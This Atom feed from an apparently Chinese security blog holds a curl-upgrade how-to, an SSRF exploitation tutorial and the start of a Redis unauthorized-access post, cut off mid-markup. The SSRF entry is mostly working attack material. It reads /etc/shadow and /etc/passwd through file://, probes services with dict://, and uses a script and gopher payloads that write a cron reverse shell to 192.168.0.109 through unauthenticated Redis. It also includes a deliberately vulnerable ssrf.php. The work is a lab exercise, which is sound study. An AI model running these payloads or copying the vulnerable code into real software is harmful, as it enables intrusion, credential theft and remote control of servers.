<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Climber</title>
  
  <subtitle>原创文章，未经授权请勿转载</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-08-26T00:14:38.716Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Climber</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Centos6 更新curl版本</title>
    <link href="http://yoursite.com/2018/08/26/2018-08-26/"/>
    <id>http://yoursite.com/2018/08/26/2018-08-26/</id>
    <published>2018-08-25T23:53:23.401Z</published>
    <updated>2018-08-26T00:14:38.716Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Centos6-更新curl版本"><a href="#Centos6-更新curl版本" class="headerlink" title="Centos6 更新curl版本"></a>Centos6 更新curl版本</h1><p><strong>由于自己的Centos6.5 curl版本为7.19.7，版本太低，所以要升级curl的版本，之前自己直接采取了源码安装最新版本的方式去升级，结果导致安装完毕后自己电脑的curl版本和php-curl版本不一致的问题</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180826/IBHCm64DGe.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180826/Ekhi4h6K4a.png?imageslim" alt="mark"><br><strong>于是自己上网查了好久，终于找到了解决办法，在这里记录一下</strong><br><a id="more"></a></p><h3 id="更新Centos6-curl为最新版本"><a href="#更新Centos6-curl为最新版本" class="headerlink" title="更新Centos6 curl为最新版本"></a>更新Centos6 curl为最新版本</h3><p><strong>在这里使用 city-fan 的更新源来更新。</strong></p><p><strong>1.更新 ca-bundle</strong></p><p><strong>首先备份一下：</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cp /etc/pki/tls/certs/ca-bundle.crt /etc/pki/tls/certs/ca-bundle.crt.bak</div></pre></td></tr></table></figure></p><p><strong>更新并替换：</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl http://curl.haxx.se/ca/cacert.pem -o /etc/pki/tls/certs/ca-bundle.crt</div></pre></td></tr></table></figure></p><p><strong>2 新增 repo 源</strong></p><p><strong>新增 repo：</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim /etc/yum.repos.d/city-fan-for-curl.repo</div></pre></td></tr></table></figure></p><p><strong>Centos6 编辑为如下:</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[CityFanforCurl]</div><div class="line">name=City Fan Repo</div><div class="line">baseurl=http://www.city-fan.org/ftp/contrib/yum-repo/rhel6/x86_64/</div><div class="line">enabled=0</div><div class="line">gpgcheck=0</div></pre></td></tr></table></figure></p><p><strong>Centos7 编辑为如下：</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[CityFanforCurl]</div><div class="line">name=City Fan Repo</div><div class="line">baseurl=http://www.city-fan.org/ftp/contrib/yum-repo/rhel7/x86_64/</div><div class="line">enabled=0</div><div class="line">gpgcheck=0</div></pre></td></tr></table></figure></p><p><strong>3.更新curl</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum update curl --enablerepo=CityFanforCurl -y</div></pre></td></tr></table></figure><p><strong>4.重启服务</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">service php-fpm restart</div><div class="line">service httpd restart</div></pre></td></tr></table></figure><p><strong>这时可以看到版本就一致了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180826/841L8IiaBf.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180826/ei4i2KHI8j.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Centos6-更新curl版本&quot;&gt;&lt;a href=&quot;#Centos6-更新curl版本&quot; class=&quot;headerlink&quot; title=&quot;Centos6 更新curl版本&quot;&gt;&lt;/a&gt;Centos6 更新curl版本&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;由于自己的Centos6.5 curl版本为7.19.7，版本太低，所以要升级curl的版本，之前自己直接采取了源码安装最新版本的方式去升级，结果导致安装完毕后自己电脑的curl版本和php-curl版本不一致的问题&lt;/strong&gt;&lt;br&gt;&lt;img src=&quot;http://p008biu9n.bkt.clouddn.com/blog/180826/IBHCm64DGe.png?imageslim&quot; alt=&quot;mark&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://p008biu9n.bkt.clouddn.com/blog/180826/Ekhi4h6K4a.png?imageslim&quot; alt=&quot;mark&quot;&gt;&lt;br&gt;&lt;strong&gt;于是自己上网查了好久，终于找到了解决办法，在这里记录一下&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="其它" scheme="http://yoursite.com/categories/%E5%85%B6%E5%AE%83/"/>
    
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>ssrf漏洞原理以及利用方法</title>
    <link href="http://yoursite.com/2018/08/25/ssrf/"/>
    <id>http://yoursite.com/2018/08/25/ssrf/</id>
    <published>2018-08-24T16:28:52.369Z</published>
    <updated>2018-08-26T01:22:00.751Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ssrf漏洞原理以及利用方法"><a href="#ssrf漏洞原理以及利用方法" class="headerlink" title="ssrf漏洞原理以及利用方法"></a>ssrf漏洞原理以及利用方法</h1><p><strong>ssrf漏洞，全称为服务端请求伪造漏洞，由于有的web应用需要实现从其它服务器上获取资源的功能，但是没有对url进行限制，导致可以构造非本意的url对内网或者其它服务器发起恶意请求。ssrf漏洞的危害可以通过ssrf漏洞可以对内网或本地机器进行主机发现，服务版本探测或者针对内网或本地一些薄弱的应用进行攻击，同时利用ssrf漏洞还可以时服务器主动发起请求，从而做为一个攻击跳板或者绕过CDN找到其服务器的真实ip</strong><br><a id="more"></a></p><h3 id="ssrf中一些可以利用的curl协议"><a href="#ssrf中一些可以利用的curl协议" class="headerlink" title="ssrf中一些可以利用的curl协议"></a>ssrf中一些可以利用的curl协议</h3><p><strong>ssrf的利用方式取决于服务器所支持的curl协议，之前自己为了做该实验升级了curl的版本为最新版本，目前Centos6的curl版本为<code>7.61.0</code>,查看一下其支持的协议</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180826/IBHCm64DGe.png?imageslim" alt="mark"><br><strong>首先使用curl本地测试一些ssrf的攻击方法</strong></p><p><strong>利用file协议读取服务器的文件：</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -v <span class="string">"file:///etc/shadow"</span></div></pre></td></tr></table></figure></p><p><strong>权限比较大的话，直接读取系统影子文件,不过这种情况也只是在本地测试中以root用户运行curl时才会存在</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180826/7C2jmCKak0.png?imageslim" alt="mark"><br><strong>利用dict协议去进行服务版本探测：</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -v <span class="string">"dict://127.0.0.1:22/info</span></div></pre></td></tr></table></figure></p><p><strong>进行ssh服务的版本探测</strong></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180826/felI287dFD.png?imageslim" alt="mark"><br><strong>利用gopher协议扩大攻击面，攻击本地或者内网的一些脆弱的地方</strong></p><p><strong>举个栗子：比如redis数据库的默认配置允许可以直接在本地无需密码直接访问数据库，通过redis未授权访问漏洞可以通过在本地访问数据库，执行数据库语句，以利于redis未授权访问漏洞结合linux cron反弹shell为例</strong></p><p><strong>首先先写一个可以自动利用的shell脚本</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vi rediscron.sh</div></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> -e <span class="string">"\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.0.109/7777 0&gt;&amp;1\n\n"</span> | redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x <span class="built_in">set</span> aaa</div><div class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> config <span class="built_in">set</span> dir /var/spool/cron</div><div class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> config <span class="built_in">set</span> dbfilename root</div><div class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> save</div><div class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> quit</div></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chmod +x rediscron.sh</div></pre></td></tr></table></figure><p><strong>之后执行脚本: </strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./rediscron.sh 127.0.0.1 6379</div></pre></td></tr></table></figure></p><p><strong>此时redis数据库的配置为没有修改的默认配置，我们可以通过本地访问redis去利用未授权访问漏洞反弹shell，可以看到执行脚本后成功在/var/spool/cron下创建了一个反弹shell的任务计划文件</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180826/fGLgBA73b9.png?imageslim" alt="mark"></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180826/kGb2F8f109.png?imageslim" alt="mark"></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180826/AcBK1kBhmD.png?imageslim" alt="mark"></p><p><strong>现在有一个问题就是如何将其转化为gopher协议的格式去利用，这里要利用到socat这个工具,去<a href="http://www.dest-unreach.org/socat/" title="socat官网" target="_blank" rel="external">socat官网</a>下载</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180826/gLCLjHD4AJ.png?imageslim" alt="mark"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">wget http://www.dest-unreach.org/socat/download/socat-1.7.3.2.tar.gz</div><div class="line">tar -zxvf socat-1.7.3.2.tar.gz</div><div class="line"><span class="built_in">cd</span> socat-1.7.3.2</div><div class="line">./configure</div><div class="line">make</div><div class="line">make install</div></pre></td></tr></table></figure><p><strong>之后使用socat作为中间人代理抓取流量</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">socat -v tcp-listen:4444,fork tcp-connect:localhost:6379</div></pre></td></tr></table></figure><p><strong>这条命令的意思相当于是发往6379端口的数据会先经过本地的4444端口，相当于做了一个代理去抓包，可以理解为burpsuite抓包的原理</strong></p><p><strong>之后再次执行</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./rediscron.sh 127.0.0.1 4444</div></pre></td></tr></table></figure></p><p><strong>可以看到socat抓到了redis攻击的数据流量,具体内容如下:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line">&gt; 2018/08/25 01:51:28.003621  length=87 from=0 to=86</div><div class="line">*3\r</div><div class="line"><span class="variable">$3</span>\r</div><div class="line"><span class="built_in">set</span>\r</div><div class="line"><span class="variable">$3</span>\r</div><div class="line">aaa\r</div><div class="line"><span class="variable">$58</span>\r</div><div class="line"></div><div class="line"></div><div class="line">* * * * * bash -i &gt;&amp; /dev/tcp/192.168.0.109/7777 0&gt;&amp;1</div><div class="line"></div><div class="line"></div><div class="line">\r</div><div class="line">&lt; 2018/08/25 01:51:28.003804  length=5 from=0 to=4</div><div class="line">+OK\r</div><div class="line">&gt; 2018/08/25 01:51:28.007530  length=56 from=0 to=55</div><div class="line">*4\r</div><div class="line"><span class="variable">$6</span>\r</div><div class="line">config\r</div><div class="line"><span class="variable">$3</span>\r</div><div class="line"><span class="built_in">set</span>\r</div><div class="line"><span class="variable">$3</span>\r</div><div class="line">dir\r</div><div class="line"><span class="variable">$15</span>\r</div><div class="line">/var/spool/cron\r</div><div class="line">&lt; 2018/08/25 01:51:28.007715  length=5 from=0 to=4</div><div class="line">+OK\r</div><div class="line">&gt; 2018/08/25 01:51:28.012076  length=52 from=0 to=51</div><div class="line">*4\r</div><div class="line"><span class="variable">$6</span>\r</div><div class="line">config\r</div><div class="line"><span class="variable">$3</span>\r</div><div class="line"><span class="built_in">set</span>\r</div><div class="line"><span class="variable">$10</span>\r</div><div class="line">dbfilename\r</div><div class="line"><span class="variable">$4</span>\r</div><div class="line">root\r</div><div class="line">&lt; 2018/08/25 01:51:28.012204  length=5 from=0 to=4</div><div class="line">+OK\r</div><div class="line">&gt; 2018/08/25 01:51:28.021196  length=14 from=0 to=13</div><div class="line">*1\r</div><div class="line"><span class="variable">$4</span>\r</div><div class="line">save\r</div><div class="line">&lt; 2018/08/25 01:51:28.023025  length=5 from=0 to=4</div><div class="line">+OK\r</div><div class="line">&gt; 2018/08/25 01:51:28.026348  length=14 from=0 to=13</div><div class="line">*1\r</div><div class="line"><span class="variable">$4</span>\r</div><div class="line">quit\r</div><div class="line">&lt; 2018/08/25 01:51:28.026530  length=5 from=0 to=4</div><div class="line">+OK\r</div></pre></td></tr></table></figure><p><strong>现在需要的就是将抓取到的redis攻击流量转化为gopher协议支持的格式，这里有一个转化规则</strong></p><ul><li>如果第一个字符是&gt;或者&lt; 那么丢弃该行字符串，表示请求和返回的时间。</li><li>如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。</li><li>将\r字符串替换成%0d%0a</li><li>空白行替换为%0a</li></ul><p><strong>这里直接使用三叶草joychou师傅写的转化脚本tran2gopher.py</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding: utf-8</span></div><div class="line"><span class="comment">#author: JoyChou</span></div><div class="line">import sys</div><div class="line"></div><div class="line">exp = <span class="string">''</span></div><div class="line"></div><div class="line">with open(sys.argv[1]) as f:</div><div class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</div><div class="line">        <span class="keyword">if</span> line[0] <span class="keyword">in</span> <span class="string">'&gt;&lt;+'</span>:</div><div class="line">            <span class="built_in">continue</span></div><div class="line">        <span class="comment"># 判断倒数第2、3字符串是否为\r</span></div><div class="line">        <span class="keyword">elif</span> line[-3:-1] == r<span class="string">'\r'</span>:</div><div class="line">            <span class="comment"># 如果该行只有\r，将\r替换成%0a%0d%0a</span></div><div class="line">            <span class="keyword">if</span> len(line) == 3:</div><div class="line">                exp = exp + <span class="string">'%0a%0d%0a'</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                line = line.replace(r<span class="string">'\r'</span>, <span class="string">'%0d%0a'</span>)</div><div class="line">                <span class="comment"># 去掉最后的换行符</span></div><div class="line">                line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</div><div class="line">                exp = exp + line</div><div class="line">        <span class="comment"># 判断是否是空行，空行替换为%0a</span></div><div class="line">        <span class="keyword">elif</span> line == <span class="string">'\x0a'</span>:</div><div class="line">            exp = exp + <span class="string">'%0a'</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</div><div class="line">            exp = exp + line</div><div class="line"><span class="built_in">print</span> exp</div></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python tran2gopher.py redis.log</div></pre></td></tr></table></figure><p><strong>其中redis.log为刚刚抓取到的redis攻击流量</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180826/5Gf0bKbjkB.png?imageslim" alt="mark"><br><strong>经过转化后内容如下</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">*3%0d%0a<span class="variable">$3</span>%0d%0aset%0d%0a<span class="variable">$3</span>%0d%0aaaa%0d%0a<span class="variable">$58</span>%0d%0a%0a%0a* * * * * bash -i &gt;&amp; /dev/tcp/192.168.0.109/7777 0&gt;&amp;1%0a%0a%0a%0d%0a*4%0d%0a<span class="variable">$6</span>%0d%0aconfig%0d%0a<span class="variable">$3</span>%0d%0aset%0d%0a<span class="variable">$3</span>%0d%0adir%0d%0a<span class="variable">$15</span>%0d%0a/var/spool/cron%0d%0a*4%0d%0a<span class="variable">$6</span>%0d%0aconfig%0d%0a<span class="variable">$3</span>%0d%0aset%0d%0a<span class="variable">$10</span>%0d%0adbfilename%0d%0a<span class="variable">$4</span>%0d%0aroot%0d%0a*1%0d%0a<span class="variable">$4</span>%0d%0asave%0d%0a*1%0d%0a<span class="variable">$4</span>%0d%0aquit%0d%0a%0a</div></pre></td></tr></table></figure><p><strong>在本地使用curl的gopher协议测试一下</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -v <span class="string">'gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$3%0d%0aaaa%0d%0a$58%0d%0a%0a%0a* * * * * bash -i &gt;&amp; /dev/tcp/192.168.0.109/7777 0&gt;&amp;1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$15%0d%0a/var/spool/cron%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a%0a'</span></div></pre></td></tr></table></figure></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180826/eBC0agfj8L.png?imageslim" alt="mark"><br><strong>之后可以看到利用gpoher协议成功向任务计划目录下写了一个反弹shell的任务计划</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180826/09DjgED6if.png?imageslim" alt="mark"><br><strong>成功反弹shell</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180826/KF24aD93Ef.png?imageslim" alt="mark"></p><h3 id="ssrf漏洞实例"><a href="#ssrf漏洞实例" class="headerlink" title="ssrf漏洞实例"></a>ssrf漏洞实例</h3><p><strong>存在ssrf漏洞的代码<code>ssrf.php</code>如下</strong></p><pre><code><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</div><div class="line">&lt;title&gt;ssrf漏洞实例&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;form action=<span class="string">""</span>&gt;</div><div class="line">input:&lt;input type=<span class="string">"text"</span> name=<span class="string">"url"</span> value=<span class="string">""</span>/&gt;</div><div class="line">&lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"get"</span>&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'submit'</span>]))</div><div class="line">&#123;</div><div class="line">       $ch = curl_init(); </div><div class="line">       curl_setopt($ch, CURLOPT_URL, $_GET[<span class="string">'url'</span>]); </div><div class="line">       <span class="comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span></div><div class="line">       curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); </div><div class="line">       <span class="comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span></div><div class="line">       curl_exec($ch); </div><div class="line">       curl_close($ch); </div><div class="line">&#125; </div><div class="line"> <span class="meta">?&gt;</span></div><div class="line">&lt;/form&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></code></pre><p><strong>漏洞场景：web应用实现了从其他服务器获取资源的功能，由于对url过滤不严而产生ssrf漏洞</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.0.103/ssrf.php?url=http%3A%2F%2Fwww.4o4notfound.org%2Findex.php%2Farchives%2F33%2F&amp;submit=get</div></pre></td></tr></table></figure></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180826/J6CfGcEE46.png?imageslim" alt="mark"></p><p><strong>首先查看php-curl扩展所支持的curl协议</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180826/ei4i2KHI8j.png?imageslim" alt="mark"><br><strong>使用dict协议对本地服务进行探测,探测ssh服务版本payload:</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.0.103/ssrf.php?url=dict%3A%2F%2F127.0.0.1%3A22%2Finfo&amp;submit=get</div></pre></td></tr></table></figure></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180826/2Lkjme2gk4.png?imageslim" alt="mark"><br><strong>探测redis服务版本payload:</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.0.103/ssrf.php?url=dict%3A%2F%2F127.0.0.1%3A6379%2Finfo&amp;submit=get</div></pre></td></tr></table></figure></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180826/iJkI2mFLH4.png?imageslim" alt="mark"><br><strong>使用file协议读取服务器文件payload：</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.0.103/ssrf.php?url=file%3A%2F%2F%2Fetc%2Fpasswd&amp;submit=get</div></pre></td></tr></table></figure></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180826/ekjlF5eJ12.png?imageslim" alt="mark"><br><strong>使用gopher协议攻击本地redis反弹shell payload：</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.0.103/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_*3%250d%250a%243%250d%250aset%250d%250a%243%250d%250aaaa%250d%250a%2458%250d%250a%250a%250a*+*+*+*+*+bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.0.109%2F7777+0%3E%261%250a%250a%250a%250d%250a*4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2415%250d%250a%2Fvar%2Fspool%2Fcron%250d%250a*4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a*1%250d%250a%244%250d%250asave%250d%250a*1%250d%250a%244%250d%250aquit%250d%250a%250a&amp;submit=get</div></pre></td></tr></table></figure></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180826/im7DLj8FEH.png?imageslim" alt="mark"><br><strong>可以看到成功通过gopher协议攻击了本地的redis服务，向任务计划目录下写了一个反弹shell的cron文件</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180826/d26K0ef5fk.png?imageslim" alt="mark"><br><strong>在kali上成功反弹到了shell</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180826/J2mHj0hfj9.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;ssrf漏洞原理以及利用方法&quot;&gt;&lt;a href=&quot;#ssrf漏洞原理以及利用方法&quot; class=&quot;headerlink&quot; title=&quot;ssrf漏洞原理以及利用方法&quot;&gt;&lt;/a&gt;ssrf漏洞原理以及利用方法&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;ssrf漏洞，全称为服务端请求伪造漏洞，由于有的web应用需要实现从其它服务器上获取资源的功能，但是没有对url进行限制，导致可以构造非本意的url对内网或者其它服务器发起恶意请求。ssrf漏洞的危害可以通过ssrf漏洞可以对内网或本地机器进行主机发现，服务版本探测或者针对内网或本地一些薄弱的应用进行攻击，同时利用ssrf漏洞还可以时服务器主动发起请求，从而做为一个攻击跳板或者绕过CDN找到其服务器的真实ip&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ssrf" scheme="http://yoursite.com/tags/ssrf/"/>
    
  </entry>
  
  <entry>
    <title>centos环境下的redis未授权访问漏洞的几种利用方式</title>
    <link href="http://yoursite.com/2018/08/19/redis/"/>
    <id>http://yoursite.com/2018/08/19/redis/</id>
    <published>2018-08-18T17:57:33.854Z</published>
    <updated>2018-08-24T16:31:15.188Z</updated>
    
    <content type="html"><![CDATA[<h1 id="centos环境下的redis未授权访问漏洞的几种利用方式"><a href="#centos环境下的redis未授权访问漏洞的几种利用方式" class="headerlink" title="centos环境下的redis未授权访问漏洞的几种利用方式"></a>centos环境下的redis未授权访问漏洞的几种利用方式</h1><p><strong>这篇文章记录一下redis未授权访问漏洞的几种利用方式,包括如何利用redis未授权访问漏洞通过任务计划反弹shell，向网站根目录写webshell以及利用redis未授权访问向服务器写入ssh公钥</strong><br><a id="more"></a></p><h3 id="漏洞利用环境"><a href="#漏洞利用环境" class="headerlink" title="漏洞利用环境"></a>漏洞利用环境</h3><p><strong>靶机：centos6.4:192.168.0.104，开启了redis-server，由于配置不当而存在redis未授权访问</strong></p><p><strong>攻击机：kali2.0：192.168.0.101，用来攻击配置不当导致存在redis未授权访问漏洞的centos6.4</strong></p><p><strong>修改centos中redis配置文件redis.conf中的几个地方</strong></p><pre><code>1.bind 127.0.0.1前面需要加上注释符，保证远程ip可以访问redis数据库2.protected-mode要修改为no，否则远程连接数据库的ip执行不了数据库语句</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/L7g94HcIji.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/8E377C775B.png?imageslim" alt="mark"><br><strong>只有修改了这两处配置，才能远程连接redis服务并且执行数据库语句</strong></p><h3 id="利用redis未授权访问漏洞反弹shell"><a href="#利用redis未授权访问漏洞反弹shell" class="headerlink" title="利用redis未授权访问漏洞反弹shell"></a>利用redis未授权访问漏洞反弹shell</h3><p><strong>首先在centos上开启redis服务</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./src/redis-server redis.conf</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/DF7D9Cm9AG.png?imageslim" alt="mark"></p><p><strong>接下来使用kali上的redis-cli去访问redis-server</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./src/redis-cli -h 192.168.0.104 -p 6379</div></pre></td></tr></table></figure><p><strong>可以看到由于配置不当导致redis未授权访问漏洞，可以直接进入redis的交互式shell</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/AelG2eB0m2.png?imageslim" alt="mark"></p><p><strong>下面通过该redis未授权访问漏洞利用linux任务计划来反弹一个shell到我们的kali上面</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div 